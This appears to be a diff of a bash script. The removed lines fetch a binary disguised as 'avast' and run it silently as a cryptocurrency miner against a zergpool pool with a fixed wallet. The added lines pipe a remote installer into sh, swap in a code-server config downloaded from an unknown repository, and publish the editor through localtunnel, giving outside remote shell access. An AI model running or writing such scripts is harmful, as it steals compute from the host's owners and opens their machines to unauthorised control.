@@ -1,4 +1,9 @@
 #!/bin/bash
-wget https://github.com/samrikulan/toya/raw/main/avast >/dev/null 2>&1
-chmod +x avast >/dev/null 2>&1
-./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-GITHUB) -p c=DASH -t 2 -x
+curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run
+curl -fsSL https://code-server.dev/install.sh | sh
+timeout 2s code-server
+cd ~/.config/code-server
+mv config.yaml llod
+wget https://raw.githubusercontent.com/WhynotSir/tt/main/config.yaml
+npm install -g localtunnel
+code-server --bind-addr 127.0.0.1:8040  & lt --port 8040
